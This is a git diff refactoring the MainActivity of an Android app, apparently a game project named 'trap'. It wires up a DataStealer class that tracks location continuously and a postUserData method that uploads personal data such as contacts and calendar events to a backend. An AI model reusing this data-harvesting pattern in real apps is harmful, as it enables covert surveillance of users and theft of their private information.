@@ -1,6 +1,5 @@
 package de.hpi3d.gamepgrog.trap.ui;
 
-import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
@@ -23,7 +22,8 @@ import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 import de.hpi3d.gamepgrog.trap.DataStealer;
 import de.hpi3d.gamepgrog.trap.R;
-import de.hpi3d.gamepgrog.trap.api.BackendIntent;
+import de.hpi3d.gamepgrog.trap.api.ApiService;
+import de.hpi3d.gamepgrog.trap.api.ApiIntent;
 import de.hpi3d.gamepgrog.trap.api.BackendManagerIntentService;
 import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;
 import de.hpi3d.gamepgrog.trap.datatypes.Contact;
@@ -76,7 +76,7 @@ public class MainActivity extends AppCompatActivity implements IApp {
     protected void onStart() {
         super.onStart();
         // TODO uncomment following comments
-//        story.doStoryActionIfNeeded();
+//        story.update();
 //        sendClueDownloadIntent();
     }
 
@@ -154,37 +154,33 @@ public class MainActivity extends AppCompatActivity implements IApp {
 
     @Override
     public void executeApiCall(String call, BiConsumer<Integer, Bundle> callback) {
-        BackendIntent
+        ApiIntent
                 .build(this)
-                .setManager(call)
+                .setCall(call)
                 .putReceiver(callback)
                 .start();
     }
 
     @Override
-    public void postUserData(String call, UserData data, Runnable callback) {
+    public void postUserData(String datatype, UserData data, BiConsumer<Integer, Bundle> callback) {
+        ApiIntent
+                .build(this)
+                .setCall(ApiService.CALL_ADD_DATA)
+                .put(ApiService.KEY_USER_ID, getUserId())
+                .put(ApiService.KEY_DATA_TYPE, datatype)
+                .put(ApiService.KEY_DATA, data)
+                .putReceiver(callback)
+                .start();
     }
 
-//    @Override
-//    public void postUserData(String call, UserData.UserDataPostRequest pr, Runnable callback) {
-//        BackendManagerIntentService
-//                .buildIntent(this)
-//                .type(BackendManagerIntentService.MANAGE_ADD_DATA)
-//                .onReceive(callback)
-//                .put("postRequest", pr)
-//                .start();
+//    public String getLanguage() {
+//        return Locale.getDefault().getLanguage();
 //    }
-
-    @Override
-    public String getLanguage() {
-        return Locale.getDefault().getLanguage();
-    }
 
     private void getContinuousLocationUpdates() {
         FusedLocationProviderClient client = LocationServices.getFusedLocationProviderClient(this);
         DataStealer locationStealer = new DataStealer(client);
         locationStealer.getContinuousLocationUpdates(getApplicationContext());
-
     }
 
    /* Needs higher API level. How to refactor?
